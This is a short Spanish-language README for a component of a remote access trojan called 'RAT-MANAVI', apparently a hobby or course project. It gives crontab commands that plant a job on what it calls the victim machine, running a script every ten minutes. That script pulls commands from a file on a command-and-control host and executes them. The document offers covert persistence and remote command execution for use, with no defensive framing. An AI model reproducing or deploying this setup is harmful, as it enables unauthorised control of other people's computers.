#C&C

Este programa debe ejecutarse con una tarea progreama cada cierto tiempo podría ser cada 5 min o 10 min. 
comando:

echo "0,10,20,30,40,50 * * * * /candc.py" >> /tmp/tare.txt
crontab -u koala /tmp/tare.txt 
rm /tmp/tare.txt

----------------o----------------o----------------o----------------o-------

- Realiza la conexión al comand and control, leyendo los comandos escritos en el archivo "comandos.txt" ubicado en el directorio home del usuario manavi del equipo candc para ejecutarlos   posteriormente.
- Este script debe estar dento de la carpeta RAT-MANAVI, es decir en el equipo víctima.
- En el instalador se agrega la tarea en el cron para ejecutar este script cada 10 min.
